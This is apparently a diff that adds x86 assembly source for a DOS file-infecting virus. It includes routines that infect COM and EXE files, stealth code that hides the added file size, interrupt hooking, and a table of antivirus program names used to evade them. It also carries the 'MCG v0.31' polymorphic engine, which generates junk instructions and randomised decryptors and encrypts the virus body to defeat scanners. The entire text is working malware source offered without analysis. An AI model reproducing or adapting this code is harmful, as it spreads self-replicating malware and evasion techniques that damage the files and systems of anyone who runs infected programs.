+	     mov     ah,2fh		 ; Get Disk Transfer Area (DTA) add...
+	     call    int21_simula
+
+	     lodsb			 ; AL = signature for extended FCB
+	     sub     si,si		 ; Zero SI
+	     inc     al 		 ; Extended File Control Block (XFCB)?
+	     jnz     not_extended	 ; Not zero? Jump to not_extended
+
+	     add     bx,07h		 ; BX = offset of File Control Bloc...
+not_extended:
+	     mov     ax,es:[bx+17h]	 ; AX = file time
+	     db      10000011b,11100000b ; AND AX,1Fh (opcode 83h,0e0h,1fh)
+	     db      00011111b
+	     db      10000011b,11111000b ; CMP AX,1Fh (opcode 83h,0f80h,1eh)
+	     db      00011110b
+	     jne     filesiz_exit	 ; Not equal? Jump to filesiz_exit
+
+	     mov     ax,es:[bx+1dh]	 ; AX = low-order word of filesize
+	     mov     dx,es:[bx+1fh]	 ; DX = high-order word of filesize
+
+	     sub     ax,(code_end-code_begin)
+	     sbb     dx,00h		 ; Convert to 32-bit
+	     jb      filesiz_exit	 ; Below? Jump to filesiz_exit
+
+	     mov     es:[bx+1dh],ax	 ; Store low-order word of filesize
+	     mov     es:[bx+1fh],dx	 ; Store high-order word of filesize
+filesiz_exit:
+	     pop     ds es si dx bx ax	 ; Load registers from stack
+filesiz_exi_:
+	     iret			 ; Interrupt return
+
+infect_file_ proc    near		 ; Infect COM/EXE file
+	     cli			 ; Clear interrupt-enable flag
+	     mov     [stack_seg],ss	 ; Store stack segment
+	     mov     [stack_ptr_],sp	 ; Store stack pointer
+
+	     push    cs 		 ; Save CS at stack
+	     pop     ss 		 ; Load SS from stack (CS)
+
+	     lea     sp,stack_ptr	 ; SP = stack pointer
+	     sti			 ; Set interrupt-enable flag
+
+	     mov     cs:[payload_stat],00h
+
+	     call    examine_name
+	     jc      infect_exit_	 ; Error? Jump to infect_exit_
+
+	     call    payload_
+
+	     mov     [infect_stat],01h	 ; Infect file
+
+	     cmp     [execute_stat],00h  ; COM executable?
+	     je      infect_com__	 ; Equal? Jump to infect_com__
+	     cmp     [execute_stat],01h  ; EXE executable?
+	     je      infect_exe__	 ; Equal? Jump to infect_exe__
+
+	     jmp     error_
+infect_exe__:
+	     call    sto_file_att
+	     jc      infect_exit_	 ; Error? Jump to infect_exit_
+
+	     call    open_file
+	     jc      infect_exit_	 ; Error? Jump to infect_exit_
+
+	     call    get_file_inf
+
+	     mov     al,02h		 ; Set current file position (EOF)
+	     call    set_file_pos
+	     mov     word ptr [filesize],ax
+	     mov     word ptr [filesize+02h],dx
+
+	     call    infect_exe
+	     jc      infect_exit	 ; Error? Jump to infect_exit
+
+	     mov     [infect_stat],00h	 ; Don't infect file
+
+	     call    infect_file
+	     jmp     infect_exit
+infect_com__:
+	     call    sto_file_att
+	     jc      infect_exit_	 ; Error? Jump to infect_exit_
+
+	     call    open_file
+	     jc      infect_exit_	 ; Error? Jump to infect_exit_
+
+	     call    get_file_inf
+
+	     mov     al,02h		 ; Set current file position (EOF)
+	     call    set_file_pos
+	     mov     word ptr [filesize],ax
+	     mov     word ptr [filesize+02h],dx
+
+	     call    examine_com
+	     jc      infect_exit	 ; Error? Jump to infect_exit
+	     call    infect_com
+	     jc      infect_exit	 ; Error? Jump to infect_exit
+
+	     call    infect_file
+	     call    mark_com
+
+	     mov     [infect_stat],00h	 ; Don't infect file
+infect_exit:
+	     call    set_file_inf
+	     call    close_file
+infect_exit_:
+	     mov     cs:[payload_stat],01h
+
+	     cli			 ; Clear interrupt-enable flag
+	     push    [stack_seg]	 ; Save stack segment at stack
+	     pop     ss 		 ; Load SS from stack (stack segment)
+
+	     mov     sp,[stack_ptr_]	 ; SP = stack pointer
+	     sti			 ; Set interrupt-enable flag
+
+	     jmp     no_error
+	     endp
+
+table_begin:
+scan_strings db      90h,90h,0e8h,0cch	 ; Scan string of DOS kernel v 3.xx
+	     db      90h,90h,0e8h,0cch	 ; Scan string of DOS kernel v 4.xx
+	     db      90h,90h,0e8h,0cch	 ; Scan string of DOS kernel v 5.xx
+	     db      90h,90h,0e8h,0cch	 ; Scan string of DOS kernel v 6.xx
+table_end:
+execute_stat db      ?			 ; Executable status
+filename_off dw      ?			 ; Offset of filename
+filename_seg dw      ?			 ; Segment of filename
+file_attr    dw      ?			 ; File attributes
+file_date    dw      ?			 ; File date
+file_time    dw      ?			 ; File time
+filesize     dd      ?			 ; Filesize
+file_handle  dw      ?			 ; File handle
+initial_ss   dw      ?			 ; Initial SS relative to start of ...
+initial_sp   dw      ?			 ; Initial SP
+initial_cs   dw      ?			 ; Initial CS relative to start of ...
+initial_ip   dw      ?			 ; Initial IP
+	     db      21h,98h,01h,00h,0adh,0deh
+exe_extensio db      'EXE'               ; EXE extension
+com_extensio db      'COM'               ; COM extension
+table_begin_:
+name_table   db      'SC'                ; McAfee ViruScan
+	     db      'CL'                ;   "       "
+	     db      'VI'                ; VIRSTOP
+	     db      'VS'                ; Vsafe
+	     db      'MS'                ; Microsoft Anti-Virus
+	     db      'CP'                ; Central Point Anti-Virus
+	     db      'F-'                ; F-PROT
+	     db      'IM'                ; Integrity Master
+	     db      'VH'                ; VHunter
+	     db      'TB'                ; ThunderByte Anti-Virus
+table_end_:
+	     db      00h,00h
+part_offset  dw      ?			 ; Offset in file of current polymo...
+part_length  dw      ?			 ; Length of polymorphic parts + in...
+part_offset_ dw      ?			 ; Offset in memory of current poly...
+part_offse   dw      ?			 ; Offset in file of current polymo...
+poly_parts   dw      01h		 ; Number of polymorphic parts
+part_length_ dw      ?			 ; Length of current polymorphic part
+delta_offse_ dw      ?			 ; Delta offset
+infect_stat  db      ?			 ; Infect status			..
+	     db      01h
+payload_stat db      ?			 ; Payload status
+trace_status db      ?			 ; Trace flag status
+	     db      08h dup(00h)
+dos_version  dw      ?			 ; DOS version number
+program_seg  dw      ?			 ; Segment of Program Segment Prefi...
+int21_addr   dd      ?			 ; Address of interrupt 21h
+int21_addr_  dd      ?			 ; Address pf interrupt 21h
+int24_addr   dd      ?			 ; Address of interrupt 24h
+	     db      08h dup(00h)
+int13_addr   dd      ?			 ; Address of interrupt 13h
+stack_seg    dw      ?			 ; Stack segment
+stack_ptr_   dw      ?			 ; Stack pointer
+ax_	     dw      ?			 ; Accumulator register
+bx_	     dw      ?			 ; Base register
+cx_	     dw      ?			 ; Count register
+dx_	     dw      ?			 ; Data register
+ds_	     dw      ?			 ; Data segment
+es_	     dw      ?			 ; Extra segment
+si_	     dw      ?			 ; Source index
+di_	     dw      ?			 ; Destination index
+bp_	     dw      ?			 ; Base pointer
+data_buffer  db      1ch dup(?) 	 ; Data buffer
+data_buffer_ db      04h dup(?) 	 ;  "     "
+flags	     db      00h		 ; Flags
+; ƒƒƒƒƒƒƒ Poly engine start ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
+
+assign_val	dw 0			; value to be assigned when calling
+					; the do_assign procedure
+assign_reg	db 0			; register to be used when calling
+					; the do_assign procedure
+encrypt_key	dw 0			; encryption key used
+run_offset	dw 0			; offset at which the decryptor will
+					; run (BP at input)
+poly_flags	db 0			; flags given to poly engine are
+					; stored here
+loop_start	dw 0			; pointer to start of the decryption
+					; loop
+rnd_pnt_off	dw 0			; random value added to the pointer
+					; in the decryption instruction
+decrypt_start	dw 0			; pointer to decryptor start
+dec_length	dw 0			; decryptor length
+regs_assigned	db 0			; 1 if pointer and counter registers
+					; have been assigned yet, 0 otherwise
+use_loop	db 0			; 0 if LOOP instruction will be used
+					; in dec loop, 1 don't force LOOP
+
+poly_name_ver	db '[MCG v0.31·]'
+
+reg_no_assign:			; Registers that can't be used as temporary
+				; when assigning a value
+		db    0 	; AX
+		db    1 	; CX
+		db    3 	; BX
+		db    4 	; BP
+
+mul2_in_si	proc near
+;
+; this procedure multiplies AX by two and puts the result in SI. this is used
+; when selecting elements from the procedures tables later, since each address
+; in a word long.
+;
+		nop
+		nop
+		mov	bx, 2
+		mul	bx			; simply ax * 2 and then
+		mov	si, ax			; store in si
+		retn
+mul2_in_si	endp
+
+
+get_random	proc near
+		push	cx
+		mov	cx, 1eh
+
+persist_rnd:
+		call	get_rnd_num
+		loop	persist_rnd		; call the real rnd_generator
+		pop	cx			; a few times to be more
+		retn				; randomized
+get_random	endp
+
+
+some_garbage	proc near
+		test	byte ptr [poly_flags], 40h	; garbage allowed?
+		jnz	return_garbage
+some_garbage_:
+		push	cx
+		call	get_rnd_num
+		and	al, 7
+		sub	ah, ah				; select how much
+		mov	ch, ah				; garbage inst. to do
+		mov	cl, al				; between 01h and 08h
+		inc	cx
+
+garbage_loop_2:
+		call	garbage_instr			; do given number of
+		loop	garbage_loop_2			; garbage instructions
+		pop	cx
+return_garbage:
+		retn
+some_garbage	endp
+
+
+select_reg_ass	proc near
+		push	ax
+		push	cx
+		push	di
+		db	10001101b,00111110b ; point to table of ones
+		dw	reg_no_assign	    ; that can't be used
+		mov	cx, 4
+		mov	al, ah
+		repne	scasb			; check if randomly selected
+		pop	di			; can be used or not
+		pop	cx
+		pop	ax
+		jnz	ok_regi_ass		; NZ means register can be used
+		mov	ah, 2			; if can't use that one then
+ok_regi_ass:					; use register DX
+		retn
+select_reg_ass	endp
+
+garbage_sel:
+;
+; table with offsets to garbage generation routines
+;
+		dw offset garbage_way_1
+		dw offset garbage_way_2
+		dw offset garbage_way_5
+		dw offset garbage_way_4
+		dw offset garbage_way_7
+		dw offset garbage_way_3
+		dw offset garbage_way_7
+		dw offset garbage_way_6
+
+one_byters:
+;
+; one byte instructions that can be generated as garbage
+;
+		nop
+		clc
+		stc
+		cmc
+		cli
+		nop
+		cld
+		cmc
+
+math_garb:
+;
+; possible garbage operations. this are the ones that doesn't modify the
+; register content when using the same register as source and destination
+;
+		db    8 	; or  opcode
+		db  20h 	; and opcode
+		db    8 	; or  opcode
+		db  88h 	; mov opcode
+
+zero_reg:
+;
+; possible instructions used to zero a register when both source and destination
+; are the same register
+;
+		db  2bh 	; sub opcode
+		db  31h 	; xor opcode
+
+
+garbage_instr	proc near
+;
+; this routine generates a garbage instruction
+;
+		pushf
+		push	ax
+		push	bx			; save some registers
+		push	cx
+		push	dx
+		call	get_random		; select from the given
+		db	10000011b,11100000b	; AND AX,07h
+		db	00000111b		; (opcode 83h,0e0h,07h)
+		call	mul2_in_si		; convert to offset in SI
+		call	get_random		; rnd value in AX for garbage
+						; routines
+		jmp	word ptr cs:[si + offset garbage_sel]	; generate
+return_garbage_:
+		pop	dx
+		pop	cx			; restore and return back
+		pop	bx
+		pop	ax
+		popf
+		retn
+garbage_instr	endp
+
+; ƒƒƒƒƒƒƒ Garbage generator routines ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
+
+garbage_way_1:
+;
+; this selects one one-byte instruction from the table
+;
+		and	al, 7			; 8 one byte opcodes
+		db	10001101b,00011110b	; select one from table
+		dw	one_byters
+		xlat
+		stosb				; and store
+		jmp	short return_garbage_
+
+garbage_way_2:
+;
+; this generates three different types of 8 or 16 bit register to register
+; operations that are AND, OR and MOV
+;
+		cmp	byte ptr [regs_assigned], 0
+		jnz	return_garbage_
+		and	al, 3			; 4 possible operations
+		db	10001101b,00011110b	; select one from table
+		dw	math_garb
+		push	cs
+		pop	es
+		xlat
+		mov	bl, al
+		push	cx
+		call	get_rnd_num
+		and	al, 1			; 8 or 16 bit
+		or	al, bl
+		and	ah, 38h 		; select one random pair
+		mov	bh, ah			; of registers for the
+		mov	cl, 3			; operation
+		shr	ah, cl
+		or	ah, bh			; make source and destination
+		or	ah, 0c0h		; the same register, so content
+		stosw				; isn't altered
+		pop	cx
+		jmp	short return_garbage_
+
+garbage_way_3:
+;
+; this generates two xchanges of 8 or 16 bits registers, this way important
+; data in used regs isn't lost
+;
+		and	al, 1			; 8bit (86h) or 16bit (87h)
+		or	al, 86h 		; xchg base
+		or	ah, 0c0h		; from two random regs
+		stosw				; xchange twice, so nothing
+		stosw				; changes
+		jmp	short return_garbage_
+
+garbage_way_4:
+;
+; this generates 16 types of conditional jumps to the next instruction
+;
+		and	al, 0fh 		; 0fh types of jumps
+		or	al, 70h 		; conditional jump base
+		sub	ah, ah			; on next instruction
+		stosw
+		jmp	short return_garbage_
+
+garbage_way_5:
+;
+; this generates a comparation of 8 or 16 bits of two registers. randomly
+; it also puts a conditional jump (using the garbage_way_4) routine after
+; the comparsion.
+;
+		cmp	byte ptr [regs_assigned], 0
+		jnz	return_garbage_
+		and	al, 1			; 8 or 16 bits
+		or	al, 3ah 		; cmp reg,reg prefix
+		or	ah, 0c0h		; from two random regs
+		stosw
+		call	get_rnd_num
+		test	ah, 2			; randomly add also a cond
+		jz	garbage_way_4		; jump after this cmp
+		jmp	short return_garbage_
+
+garbage_way_6:
+;
+; this generates a comparation of a 8 or 16 bit register with an immediate
+; (of course of the same size) and then puts a conditional jump after it
+;
+		cmp	byte ptr [regs_assigned], 0
+		jnz	return_garbage_
+		and	al, 1			; 8 or 16 bit
+		or	al, 3ch 		; cmp reg,immediate
+		stosb
+		test	al, 1			; depending on the used imm
+		pushf				; dimension store one or two
+		call	get_rnd_num		  ; random bytes as immediate
+		popf
+		jnz	word_immediate_cmp
+		stosb
+back_immediate_cmp:
+		jmp	short garbage_way_4
+
+word_immediate_cmp:
+		stosw
+
+		db	11101001b	 ; JMP imm16 (opcode 0e9h)
+		dw	back_immediate_cmp-garbage_way_7
+garbage_way_7:
+;
+; this generates a test between two 8 or 16 bits registers and puts a
+; conditional jump after it
+;
+		cmp	byte ptr [regs_assigned], 0
+		jz	can_do_test
+		jmp	return_garbage_
+can_do_test:
+		and	al, 1			; 8 or 16 bit
+		or	al, 84h 		; test reg,reg base
+		or	ah, 0c0h
+		stosw
+		jmp	short garbage_way_4
+
+; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
+;
+; this will generate a one byte instruction followed by a loop (using the LOOP
+; instruction) that will loop on the generated one byte instruction. this
+; routine is in the poly code but is never used.
+;
+		and	al, 7
+		db	10001101b,00011110b	; get an one byte instruction
+		dw	one_byters
+		xlat
+		stosb
+		mov	ax, 0fde2h		; loop pointing to the previous
+		stosw				; one byte instruction
+		jmp	return_garbage_
+;
+; this seems a register reference table but isn't used either in this version
+; of the poly
+;
+		db    0 ; AX
+		db    1 ; CX
+		db    4 ; BP
+		db    3 ; BX
+
+; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
+assign_sel:
+;
+; Offsets to possible way of assigning the value to the counter register
+;
+		dw offset assign_way_1
+		dw offset assign_way_2
+		dw offset assign_way_4
+		dw offset assign_way_3
+
+
+do_assign	proc near
+;
+; this subroutine creates code that assign the value given in the register AX
+; to the register which opcode is given in the register DH.
+;
+
+		pushf
+		push	ax				; save some regs
+		push	bx
+		push	cx
+		push	dx
+		mov	word ptr [assign_val], ax	; save inputs to
+		mov	byte ptr [assign_reg], dh	; procedure
+		call	get_rnd_num
+		db	10000011b,11100000b		; AND AX,03h
+		db	00000011b			; (opcode 83h,0e0h,03h)
+		call	mul2_in_si			; multiply to get
+							; memory offset
+		call	get_random			; rnd value for
+							; procedures
+		jmp	word ptr cs:[si + offset assign_sel]	; jump to it
+return_assign:
+		pop	dx
+		pop	cx
+		pop	bx			; restore and get back
+		pop	ax
+		popf
+		retn
+do_assign	endp
+
+; ƒƒƒƒƒƒƒ Register assignation routines ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
+assign_way_1:
+;
+;	mov	assign_reg,value
+;		garbage
+;
+		mov	al, 0b8h			; mov base opcode
+		or	al, byte ptr [assign_reg]	; for the used reg
+		stosb
+		mov	ax, word ptr [assign_val]	; and store register
+		stosw					; initial value
+		call	some_garbage
+		jmp	short return_assign
+
+assign_way_2:
+;
+;	mov	rnd_reg,value
+;		garbage
+;	xchg	rnd_reg,assign_reg
+;		garbage
+;
+		and	ah, 7
+		call	select_reg_ass
+		mov	dh, ah
+		mov	al, 0b8h			; mov base opcode
+		or	al, ah				; with selected reg
+		stosb
+		mov	ax, word ptr [assign_val]	; assign the value
+		stosw
+		call	some_garbage
+		mov	al, 87h 			; xchg prefix
+		mov	ah, 0c0h			; xchg registers opcode
+		or	ah, dh				; first is the one we
+							; used before, rnd_reg
+		mov	dh, byte ptr [assign_reg]
+		sub	cx, cx
+		mov	cl, 3				; and calculate for the
+		shl	dh, cl				; assign_reg one
+		or	ah, dh
+		stosw					; store the xchg
+		jmp	short return_assign
+
+assign_way_3:
+;
+;	mov	rnd_reg,value
+;		garbage
+;	push	rnd_reg
+;		garbage
+;	pop	assign_reg
+;		garbage
+;
+		and	ah, 7
+		call	select_reg_ass
+		mov	dh, ah
+		mov	al, 0b8h			; mov base opcode
+		or	al, ah				; with selected reg
+		stosb
+		mov	ax, word ptr [assign_val]	; and value
+		stosw
+		call	some_garbage
+		mov	al, 50h 			; push base opcode
+		or	al, dh				; for rnd_reg used
+		stosb
+		call	some_garbage
+		mov	dh, byte ptr [assign_reg]	; and pop to given
+		mov	al, 58h 			; register
+		or	al, dh
+		stosb
+		jmp	short return_assign
+
+assign_way_4:
+;
+;	xor/sub assign_reg,assign_reg
+;		garbage
+;	add/or	assign_reg,value
+;		garbage
+;
+		and	al, 1
+		sub	ah, ah				; using the table
+		db	10001101b,00011110b
+		dw	zero_reg			; select if zeroing
+		xlat					; using sub or xor
+		stosb
+
+		mov	bl, byte ptr [assign_reg]
+		sub	al, al
+		or	al, 0c0h			; basic prefix
+		or	al, bl				; both source and
+		mov	cl, 3				; destination will be
+		shl	bl, cl				; the given register
+		or	al, bl
+		stosb
+		call	some_garbage
+		call	get_random			; select which way to
+		and	al, 1				; correct the register
+		cmp	al, 1				; value
+		jz	correct_with_add
+		xor	ax, ax
+		mov	al, 81h 			; basic prefix
+		mov	ah, 0c8h			; OR basic opcode
+		mov	bl, byte ptr [assign_reg]	; with selected reg
+		or	ah, bl
+		stosw
+store_way_4:
+		mov	ax, word ptr [assign_val]	; and store register
+		stosw					; initial value
+		jmp	return_assign
+
+correct_with_add:
+		sub	ax, ax
+		mov	al, 81h 			; basic prefix
+		mov	bl, byte ptr [assign_reg]	; selected reg
+		or	ah, bl
+		or	ah, 0c0h			; with ADD opcode
+		stosw
+		jmp	short store_way_4
+
+; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
+
+
+; €€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
+;
+;			MCG v0.31· Poly engine entry point
+;
+;   Input parameters:
+;	AX	=	encryption value
+;	BL	=	poly engine flags
+;			  bit 0 = 1 encrypt using words, 0 using bytes
+;			  bit 1 = 1 use just reg as pointer , 0 use reg + off
+;			  bit 2 = 1 use SI as pointer, 0 use DI as pointer
+;			  bit 3 = 1 use LOOP in dec loop, 0 use DEC counter
+;			  bit 4 = 0 use ADD for encryption, 1 don't use ADD
+;			  bit 5 = 0 use SUB for encryption, 1 don't use SUB
+;				 This is overridden by bit 4. If either
+;				 bit 4 and bit 5 are 1 the XOR is used
+;			  bit 6 = 1 for no garbage, 0 for garbage
+;	BP	=	offset at which the decryptor will run
+;	ES:DI	=	where to place generated code
+;
+;   Output parameters:
+;	CX	=	decryptor length
+;	DS:DX	=	pointer to decryptor
+;
+;
+
+mcg_start	proc near
+		cld
+		push	cs
+		push	cs
+		pop	ds
+		pop	es
+		mov	word ptr [encrypt_key], ax	; store input paras
+		mov	byte ptr [poly_flags], bl	; and do some inits
+		mov	word ptr [run_offset], bp
+		mov	word ptr [decrypt_start], di
+		mov	byte ptr [regs_assigned], 0
+		mov	byte ptr [use_loop], 1
+		test	byte ptr [poly_flags], 40h	; check if we can do
+		jnz	no_first_garb			; garbage or not
+		call	get_rnd_num
+		and	al, 0fh 			; do a number between
+		sub	cx, cx				; 01h and 10h of
+		mov	cl, al				; garbage instructions
+		inc	cx				; force at least one
+
+garbage_loop_1:
+		call	garbage_instr			; do one garbage inst
+		loop	garbage_loop_1
+
+no_first_garb:
+		test	byte ptr [poly_flags], 1	; encrypt with bytes?
+		mov	dh, 1
+		jz	do_with_bytes
+		push	dx
+		xor	dx, dx
+		mov	ax,(code_end-code_begin)	; for words must
+		mov	bx, 2				; div counter by 2
+		div	bx
+		add	ax, dx
+		pop	dx
+		call	do_assign		; make counter assignation
+		jmp	short counter_assigned
+
+do_with_bytes:
+		mov	ax,(code_end-code_begin)
+		call	do_assign		; make counter assignation
+
+counter_assigned:
+		call	some_garbage
+		test	byte ptr [poly_flags], 4	; pointer register
+		jnz	pointer_with_si
+		mov	dh, 7		; use DI as pointer
+		mov	ax, 0ffffh	; put 0ffffh, will be filled later
+		call	do_assign	; make pointer assignation
+		jmp	short pointer_assigned
+
+pointer_with_si:
+		mov	dh, 6		; use SI as pointer
+		mov	ax, 0ffffh	; put 0ffffh, will be filled later
+		call	do_assign	; make pointer assignation
+
+pointer_assigned:
+		mov	byte ptr [regs_assigned], 1
+		call	some_garbage
+		mov	word ptr [loop_start], di	; save where the real
+		call	some_garbage			; decryption loop starts
+		call	some_garbage
+		mov	al, 2eh 			; CS: segment forcing
+		stosb
+		mov	al, 81h 			; base prefix
+		test	byte ptr [poly_flags], 1	; encrypting bytes?
+		jnz	using_words_enc
+		and	al, 0feh			; so prefix becames 80h
+using_words_enc:
+		stosb
+		test	byte ptr [poly_flags], 10h	; use ADD?
+		jz	add_encryption
+		test	byte ptr [poly_flags], 20h	; use SUB?
+		jz	sub_encryption
+		mov	al, 30h 			; XOR base
+		mov	byte ptr [use_loop], 0		; force LOOP if so
+		jmp	short proceed_enc
+sub_encryption:
+		mov	al, 28h 			; SUB base
+		jmp	short proceed_enc
+add_encryption:
+		sub	al, al				; ADD base
+proceed_enc:
+		test	byte ptr [poly_flags], 4	; which pointer is used
+		jz	di_is_here
+		or	al, 4				; SI
+		jmp	short proceed_enc_2
+di_is_here:
+		or	al, 5				; DI
+proceed_enc_2:
+		stosb
+		test	byte ptr [poly_flags], 2	; using reg+off in
+		pushf					; encryption?
+		sub	ax, ax
+		popf
+		jnz	using_just_reg
+
+get_rndpnt_off:
+		call	get_rnd_num			; random offset to add
+		mov	word ptr [rnd_pnt_off], ax	; save for later too
+		push	ax
+		push	bx
+		mov	bx, 200h
+		add	bx, word ptr [run_offset]
+		sub	bx, ax
+		test	bx, 0c0h
+		pop	bx
+		pop	ax
+		jz	get_rndpnt_off
+		or	byte ptr cs:[di-1], 80h 	; change to right opc.
+		stosw					; store random off
+using_just_reg:
+		test	byte ptr [poly_flags], 1	; byte or words?
+		jz	key_is_a_byte
+		mov	ax, word ptr [encrypt_key]	; store immediate word
+		stosw					; encryption key
+		jmp	short done_key_operation
+key_is_a_byte:
+		mov	al, byte ptr [encrypt_key+1]	; if encryption is done
+		stosb					; byte by byte then key
+		jmp	short done_key_operation	; is a byte
+
+done_key_operation:
+		call	some_garbage
+		call	some_garbage
+		call	some_garbage
+		call	get_rnd_num
+		and	ah, 3				; four ways of inc
+		cmp	ah, 0				; the pointer reg
+		jz	incp_scasb
+		cmp	ah, 2
+		jz	incp_cmpsb
+		cmp	ah, 3
+		jz	incp_inc
+
+		mov	al, 81h 			; math prefix
+		mov	ah, 0c0h			; add base
+		test	byte ptr [poly_flags], 4	; used as pointer?
+		jnz	add_butsi
+		or	ah, 7				; DI
+		jmp	short add_storeit
+add_butsi:
+		or	ah, 6				; SI
+add_storeit:
+		stosw
+		test	byte ptr [poly_flags], 1	; enc word or bytes?
+		jz	using_bytes_inc
+		mov	ax, 2				; words, so + 2
+		jmp	short store_the_inc
+using_bytes_inc:
+		mov	ax, 1				; bytes, so + 1
+store_the_inc:
+		stosw
+		jmp	short pointer_incremented
+
+incp_scasb:
+		test	byte ptr [poly_flags], 4	; scasb method only
+		jnz	incp_cmpsb			; if using DI
+		mov	byte ptr [use_loop], 0		; force LOOP if so
+		mov	al, 0aeh			; scasb incs DI of 1
+		test	byte ptr [poly_flags], 1	; if doing with words
+		jz	put_the_scasb
+		or	al, 1				; then to scasw
+put_the_scasb:
+		stosb
+		jmp	short pointer_incremented
+
+incp_cmpsb:
+		mov	byte ptr [use_loop], 0		; force LOOP if so
+		mov	al, 0a6h			; cmpsb
+		test	byte ptr [poly_flags], 1	; if doing with words
+		jz	put_the_cmpsb
+		or	al, 1				; then to cmpsw
+put_the_cmpsb:
+		stosb
+		jmp	short pointer_incremented
+
+incp_inc:
+		mov	al, 40h 			; inc opcode
+		test	byte ptr [poly_flags], 4	; with the correct
+		jnz	enc_with_sir			; pointer reg
+		or	al, 7				; DI
+		jmp	short store_incpointer
+enc_with_sir:
+		or	al, 6				; SI
+store_incpointer:
+		stosb
+		test	byte ptr [poly_flags], 1	; doing with words?
+		jz	pointer_incremented
+		push	ax				; if so some garbage
+		call	some_garbage			; and then one more
+		call	some_garbage			; inc pointer
+		pop	ax
+		stosb
+
+pointer_incremented:
+		call	some_garbage
+		call	some_garbage
+		test	byte ptr [poly_flags], 8	; LOOP or DEC
+		jz	dowith_inccx
+use_loopi:
+		mov	al, 0e2h			; LOOP opcode
+make_jump_off:
+		stosb
+		mov	bx, di
+		mov	dx, word ptr [loop_start]
+		sub	bx, dx
+		mov	bh, 0ffh			; calculate the offset
+		sub	bh, bl				; of the jump to the
+		xchg	al, bh				; beginning of the
+		stosb					; decryption loop
+		jmp	short finished_loop
+
+dowith_inccx:
+		cmp	byte ptr [use_loop], 0	; if forcing LOOP then use it
+		jz	use_loopi
+		mov	al, 49h 		; dec cx, this is dec counter
+		stosb
+		call	some_garbage
+		call	some_garbage
+		call	some_garbage
+		call	get_rnd_num
+		and	ah, 1			; two types of conditional
+		cmp	ah, 1			; jump to exit the loop
+		jz	jump_with_jg
+		mov	al, 75h 		; JNE opcode
+		jmp	short make_jump_off
+jump_with_jg:
+		mov	al, 7fh 		; JG opcode
+		jmp	short make_jump_off
+
+finished_loop:
+		push	di
+		mov	bx, word ptr [decrypt_start]	; caluclate length
+		sub	di, bx				; of generated
+		mov	word ptr [dec_length], di	; decryptor
+		pop	di
+		std					; will search from
+		mov	al, 0ffh			; end to beginning
+		mov	cx, word ptr [dec_length]
+
+search_pnt_ass:
+		repne scasb				; search the pointer
+		cmp	byte ptr [di], 0ffh		; assignation in
+		jnz	search_pnt_ass			; generated code
+		cld					; (the FFFFh word)
+		mov	ax, word ptr [dec_length]
+		add	ax, word ptr [run_offset]
+		test	byte ptr [poly_flags], 2
+		jnz	adjust_for_off
+		sub	ax, word ptr [rnd_pnt_off]	; if using reg+off then
+							; adjust inital pnt
+adjust_for_off:
+		stosw				 ; correct pointer assignation
+		mov	cx, word ptr [dec_length]
+		mov	dx, word ptr [decrypt_start]
+		retn
+mcg_start	endp
+
+; €€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
+
+
+encrypt_body	proc near
+;
+; this routine encrypts CX bytes starting from ES:DI with the key given in
+; the register DX. it uses the poly_flags data byte to decide which encryption
+; was used.
+;
+		push	di
+		push	cx
+		test	byte ptr [poly_flags], 1	; words or bytes?
+		jz	byte_by_byte
+		inc	cx
+		shr	cx, 1				; words
+word_by_word:
+		mov	dx, word ptr [encrypt_key]	; get again key
+		lodsw					; get a word
+		call	encrypt_word
+		stosw					; store encrypted one
+		loop	word_by_word
+		jmp	short finished_encrypt
+
+byte_by_byte:
+		mov	dx, word ptr [encrypt_key]	; get again key
+		lodsb					; get a byte
+		xchg	dh, dl				; if using bytes the
+		xor	dh, dh				; key is in high one
+		call	encrypt_word
+		stosb					; store encrypted one
+		loop	byte_by_byte
+		jmp	short finished_encrypt
+
+; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
+encrypt_word	proc near
+		test	byte ptr [poly_flags], 10h	; add to decrypt?
+		jz	enc_subbing
+		test	byte ptr [poly_flags], 20h	; sub to decrypt?
+		jz	enc_adding
+		xor	ax, dx				; else xoring
+		retn
+enc_adding:
+		add	ax, dx			; encrypt it adding
+		retn
+enc_subbing:
+		sub	ax, dx			; encrypt it subbing
+		retn
+encrypt_word	endp
+; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
+
+finished_encrypt:
+		pop	cx		; restore changed regs
+		pop	dx
+		retn			; back to caller
+encrypt_body	endp
+
